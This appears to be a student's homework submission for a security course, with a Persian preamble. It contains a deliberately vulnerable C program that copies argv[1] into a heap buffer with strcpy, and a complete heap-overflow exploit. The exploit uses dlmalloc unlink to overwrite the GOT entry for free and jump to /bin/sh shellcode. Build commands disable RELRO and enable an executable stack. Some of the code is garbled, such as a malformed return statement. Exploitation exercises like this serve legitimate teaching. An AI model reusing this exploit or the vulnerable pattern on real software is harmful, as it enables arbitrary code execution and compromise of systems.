@@ -1,1 +1,91 @@
+با توجه به اینکه علارغم تلاش و سعی در مطالعه برای سرریز کردن
+  سوال مربوطه که یک تخصیص و آزاد کردن حافظه  داشت، 
+نتوانستم آن را سرریز کنم، برای اینکه تلاشم برای این سوال را بی ثمر نبینم، 
+سعی کردم با افزودن یک تخصیص و آزاد کردن حافظه،  
+تغییر یافته آن را سرریز کنم ، حتی اگر هیچ نمره ای نداشته باشد.
+ 
+#include <stdlib.h>
+#include <string.h>
+
+int main( int argc, char * argv[] )
+{
+        char * buffer1, * buffer2;
+
+  buffer1= malloc( 500 );
+  buffer2= malloc( 20);
+        if(argc!=1)
+          strcpy(buffer1, argv[1]);
+  free(buffer1);
+ free(buffer2);
+  return( 20 (;
+} 
+…………………………………………………
+
+ 
+#include <string.h>
+#include <unistd.h>
+#define FUNCTION_POINTER ( 0x0804978c )         //Address of GOT entry for free function obtained using "objdump -R ahmadi".
+#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable ' buffer1' in ahmadi executable.
+
+#define VULNERABLE "./ahmadi"
+#define DUMMY 0xdefaced
+#define PREV_INUSE 0x1
+
+char shellcode[] =
+         "\xeb\x0assppppffff"
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+
+
+int main( void )
+{
+        char * m;
+        char argv1[ 506 + 1 ];
+        char * argv[] = { VULNERABLE, argv1, NULL };
+
+        m = argv1;
+ 
+        *( (void **)m ) = (void *)( DUMMY );
+        m += 4;
+ 
+        *( (void **)m ) = (void *)( DUMMY );
+        m += 4;
+ 
+        *( (void **)m ) = (void *)( DUMMY );
+        m += 4;
+
+        *( (void **)m ) = (void *)( DUMMY );
+        m += 4;
+ 
+        memcpy( m, shellcode, strlen(shellcode) );
+        m += strlen( shellcode );
+ 
+        memset( m, 'B', (506 - 4*4) - (4*4 + strlen(shellcode)) );
+        m += ( 506 - 4*4 ) - ( 4*4 + strlen(shellcode) );
+ 
+        *( (size_t *)m ) = (size_t)( DUMMY & ~PREV_INUSE );
+        m += 4;
+ 
+        *( (size_t *)m ) = (size_t)( -4 );
+        m += 4;
+ 
+        *( (void **)m ) = (void *)( FUNCTION_POINTER - 12 );
+        m += 4;
+ 
+        *( (void **)m ) = (void *)( CODE_ADDRESS );
+        m += 4;
+ 
+        *m = '';
+
+        execve( argv[0], argv, NULL );
+        return( -1 );
+}
+ 
+
+.............................
+root@shadow:/Practical2/HW3_chall_2# gcc -g -z norelro -z execstack -o ahmadi ahmadi.c -Wl
+
+root@shadow:/Practical2/HW3_chall_1#gcc -g -o exp exp.c
+root@shadow:/Practical2/HW3_chall_1#./exp 
+
 
